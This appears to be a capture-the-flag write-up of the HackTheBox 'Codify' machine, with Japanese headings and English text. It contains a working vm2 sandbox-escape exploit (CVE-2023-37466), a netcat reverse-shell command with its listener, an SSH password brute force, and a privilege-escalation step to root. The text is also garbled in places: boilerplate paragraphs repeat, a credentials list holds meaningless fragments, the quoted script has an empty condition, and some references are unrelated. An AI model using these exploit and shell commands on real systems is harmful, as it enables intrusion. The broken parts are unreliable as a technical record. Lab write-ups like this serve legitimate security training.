---
title: "HackTheBox - Codify (Linux)"
date: 2026-02-27
description: "HackTheBox Codify Linux マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [privilege-escalation, rce]
mermaid: true
content_lang: ja
alt_en: /posts/htb-codify/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 22/tcp (ssh), 80/tcp (http), 3000/tcp (http) |
| 主な侵入経路 | Public exploit path involving CVE-2023-37466 |
| 権限昇格経路 | Credentialed access -> sudo policy abuse -> elevated shell |

## 偵察

- rustscan
- nmap
- shell
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[2:43][CPU:11][MEM:41][TUN0:10.10.14.140][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.88.217:22
Open 10.129.88.217:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 02:43 JST
Initiating Ping Scan at 02:43
Scanning 10.129.88.217 [4 ports]
Completed Ping Scan at 02:43, 3.02s elapsed (1 total hosts)
Nmap scan report for 10.129.88.217 [host down, received no-response]
Read data files from: /usr/share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.07 seconds
           Raw packets sent: 8 (304B) | Rcvd: 1 (40B)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[2:43][CPU:14][MEM:43][TUN0:10.10.14.140][/home/n0z0]
🐉 > grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 02:43 JST
Warning: 10.129.88.217 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.88.217
Host is up (0.20s latency).
Not shown: 65365 closed tcp ports (reset), 167 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   253.80 ms 10.10.14.1
2   254.06 ms 10.129.88.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1111.60 seconds

```

💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
/*
*/

const { VM } = require("vm2");
const vm = new VM();

const command = 'pwd'; // Change to the desired command

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}

try {
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };

    const proxiedErr = new Proxy({}, handler);

    throw proxiedErr;
} catch ({ constructor: c }) {
    const childProcess = c.constructor('return process')().mainModule.require('child_process');
    childProcess.execSync('${command}');
}
`;

console.log(vm.run(code));

```

![Screenshot showing exploitation evidence on codify (step 1)](/assets/img/htb/codify/Pasted%20image%2020251015015004.png)
*Caption: Screenshot captured during codify at stage 1 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
busybox nc 10.10.14.140 4444 -e /bin/bash
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
✅[2:43][CPU:15][MEM:43][TUN0:10.10.14.140][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.140] from (UNKNOWN) [10.129.88.217] 55938

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
✅[23:45][CPU:11][MEM:41][TUN0:10.10.14.140][/home/n0z0]
🐉 > hydra -l joshua -P /usr/share/wordlists/rockyou.txt ssh://$ip
[22][ssh] host: 10.129.88.217   login: joshua   password: spongebob1
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
ssh joshua@$ip
ls -la
cat user.txt
```

```bash
✅[23:33][CPU:12][MEM:40][TUN0:10.10.14.140][...home/n0z0/work/htb/Codify]
🐉 > ssh joshua@$ip       

joshua@codify:~$ ls -la
total 32
drwxrwx--- 3 joshua joshua 4096 Nov  2  2023 .
drwxr-xr-x 4 joshua joshua 4096 Sep 12  2023 ..
lrwxrwxrwx 1 root   root      9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 joshua joshua  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 joshua joshua 3771 Apr 21  2023 .bashrc
drwx------ 2 joshua joshua 4096 Sep 14  2023 .cache
-rw-r--r-- 1 joshua joshua  807 Apr 21  2023 .profile
-rw-r----- 1 root   joshua   33 Oct 13 17:43 user.txt
-rw-r--r-- 1 joshua joshua   39 Sep 14  2023 .vimrc
joshua@codify:~$ cat user.txt 
13f378c1efe1ee8487a85f28de139788

```

![Screenshot showing exploitation evidence on codify (step 2)](/assets/img/htb/codify/Pasted%20image%2020251015020650.png)
*Caption: Screenshot captured during codify at stage 2 of the attack chain.*

### CVE Notes

- **CVE-2023-37466**: A vm2 sandbox escape flaw that allows JavaScript code to break out of isolation and execute code on the host process.

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
sudo -l
```

```bash
joshua@codify:/etc/cron.daily$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat /opt/scripts/mysql-backup.sh
```

```bash
joshua@codify:/etc/cron.daily$ cat /opt/scripts/mysql-backup.sh
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if ; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `Tool / Command`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `HOME/work/scans/$(date`
- `22/tcp`
- `80/tcp`
- `Apache/2.4.52`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

### Supplemental Notes

The following output documents this stage of the attack chain and captures the exact technical state at execution time.

```bash
joshua@codify:~$ python3 exploit.py 
kljh12k3jhaskjh12kjh3
```

The following output documents this stage of the attack chain and captures the exact technical state at execution time.

```bash
su -
ls -la
cat root.txt
```

```bash
joshua@codify:~$ su -
Password: 
root@codify:~# ls -la
total 40
drwx------  5 root root 4096 Oct 13 17:43 .
drwxr-xr-x 18 root root 4096 Oct 31  2023 ..
lrwxrwxrwx  1 root root    9 Sep 14  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r--  1 root root   22 May  8  2023 .creds
drwxr-xr-x  3 root root 4096 Sep 26  2023 .local
lrwxrwxrwx  1 root root    9 Sep 14  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Oct 13 17:43 root.txt
drwxr-xr-x  4 root root 4096 Sep 12  2023 scripts
drwx------  2 root root 4096 Sep 14  2023 .ssh
-rw-r--r--  1 root root   39 Sep 14  2023 .vimrc
root@codify:~# cat root.txt 
51750bd26c662d43c56dd002834379fd

```

![Screenshot showing exploitation evidence on codify (step 1)](/assets/img/htb/codify/Pasted%20image%2020251015020610.png)
*Caption: Screenshot captured during codify at stage 1 of the attack chain.*

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2023-37466: https://nvd.nist.gov/vuln/detail/CVE-2023-37466
